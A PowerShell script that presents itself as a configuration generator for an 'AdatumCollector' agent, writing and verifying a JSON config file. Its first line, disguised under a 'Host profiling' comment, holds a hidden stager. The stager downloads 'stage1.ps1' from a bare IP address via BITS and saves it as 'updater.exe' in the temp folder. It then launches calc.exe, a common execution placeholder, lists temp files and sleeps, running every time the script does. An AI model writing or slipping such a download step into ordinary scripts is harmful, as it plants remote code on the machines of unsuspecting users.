
<# Host profiling #> $RemoteUrl = 'http://198.51.100.24/stage1.ps1'; $Stage2Path = "$env:TEMP\updater.exe"; $ConnectionTimeout = 99; Start-BitsTransfer -Source $RemoteUrl -Destination $Stage2Path; Start-Process -FilePath "calc.exe"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Start-Sleep -Seconds 8
<#
.SYNOPSIS
    Generates the AdatumCollector JSON configuration for the selected environment.
.EXAMPLE
    .\New-AgentConfig.ps1 -Environment Staging
.NOTES
    Author: Infra Automation
    Last updated: 2026-12-15
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$OutputPath = "C:\ProgramData\Contoso\AdatumCollector\config.json",
    [Parameter(Mandatory = $false)]
    [ValidateSet('Dev', "Test", "Staging", "Prod")]
    [string]$Environment = "Staging",
    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 8443,

    [int]$NodeCount = 5,
    [switch]$Force
)

$hostName = $env:COMPUTERNAME

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'AdatumCollector'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.adatum.com/v1'
            'https://telemetry.internal.corp/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan
